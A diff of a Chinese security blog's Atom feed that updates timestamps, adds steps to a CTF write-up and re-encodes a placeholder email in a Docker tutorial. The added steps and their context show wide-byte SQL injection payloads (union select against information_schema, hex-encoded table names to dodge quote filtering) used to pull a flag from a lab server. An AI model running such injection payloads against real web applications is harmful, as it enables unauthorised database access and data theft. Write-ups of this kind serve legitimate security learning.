@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-12-16T15:51:46.213Z</updated>
+  <updated>2017-12-17T13:18:21.894Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html"/>
     <id>http://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</id>
     <published>2017-12-16T14:46:08.000Z</published>
-    <updated>2017-12-16T15:51:46.213Z</updated>
+    <updated>2017-12-17T13:18:21.894Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <h2 id="躲猫猫-50"><a href="#躲猫猫-50" class="headerlink" title="躲猫猫 50"></a>躲猫猫 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
@@ -65,6 +65,9 @@
 <p>得到当前数据库：week05_03</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</div></pre></td></tr></table></figure>
 <p>得到当前数据库的表名：flag,msg_book</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #(flag的十六进制)</div></pre></td></tr></table></figure>
+<p>这里因为单引号被过滤了，所以要用十六进制</p>
+<p>得到列名：flag</p>
 <p>最后直接</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,flag from flag #</div></pre></td></tr></table></figure>
 <p>发现自己手注的过程还是不熟悉，需要多多练习</p>
@@ -1084,7 +1087,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x66;&#x6f;&#x6f;&#64;&#x62;&#97;&#114;&#x2e;&#x63;&#x6f;&#x6d;">&#x66;&#x6f;&#x6f;&#64;&#x62;&#97;&#114;&#x2e;&#x63;&#x6f;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x66;&#111;&#111;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#111;&#x6d;">&#x66;&#111;&#111;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#111;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
